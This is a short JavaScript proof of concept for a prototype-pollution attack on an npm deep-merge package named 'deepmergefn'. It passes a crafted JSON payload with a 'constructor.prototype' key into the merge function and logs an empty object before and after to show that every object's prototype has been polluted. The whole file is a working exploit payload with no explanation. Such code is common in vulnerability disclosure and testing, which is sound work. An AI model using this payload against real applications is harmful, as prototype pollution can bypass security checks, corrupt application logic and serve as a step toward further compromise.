var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const deepMerge = require('deepmergefn');
console.log({}.polluted);
EVIL_DATA = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
deepMerge(obj, EVIL_DATA);
console.log({}.polluted);